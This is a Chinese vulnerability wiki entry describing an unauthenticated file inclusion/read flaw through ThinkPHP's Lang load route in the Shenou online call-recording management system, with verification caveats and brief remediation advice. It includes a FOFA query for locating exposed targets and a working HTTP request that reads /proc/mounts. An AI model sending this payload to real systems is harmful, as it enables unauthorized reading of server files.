---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "申瓯在线录音管理系统/ThinkPHP Lang load文件包含/读取"
product: "申瓯在线录音管理系统/ThinkPHP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "ThinkPHP版本/路由配置及Linux环境未知"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E8%AE%BE%E5%A4%87%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E8%AE%BE%E5%A4%87%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-index-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.md"
fofa: "title=\"在线录音管理系统\""
fofa_unverified: "title="
id: "vw-3c5ea87a99a69a00b79870aa"
entity_id: "ve-3c5ea87a99a69a00b79870aa"
schema_version: "1"
---

# 申瓯在线录音管理系统/ThinkPHP Lang load文件包含/读取

## 条目说明

- 对象与具体问题：申瓯在线录音管理系统/ThinkPHP；Lang load文件包含/读取
- 版本、配置及部署条件：ThinkPHP版本/路由配置及Linux环境未知
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 应映射嵌入ThinkPHP组件与产品版本，不把所有录音系统同名判断受影响
- 读取非PHP文件不证明执行任意代码，文件包含与读取能力区分
- 在野已知无来源、截图未核，缺修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

申瓯通信设备在线录音管理系统-index-文件包含漏洞，未经身份验证的攻击者可以通过该漏洞获取服务器敏感信息。

## 影响版本

在线录音管理系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：title="在线录音管理系统"

```http
GET /callcenter/public/index.php?s=index/\think\Lang/load&file=/proc/mounts HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

```

![image-20250326114838446](./.resource/申瓯通信设备在线录音管理系统-index-文件包含/media/image-20250326114838446.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
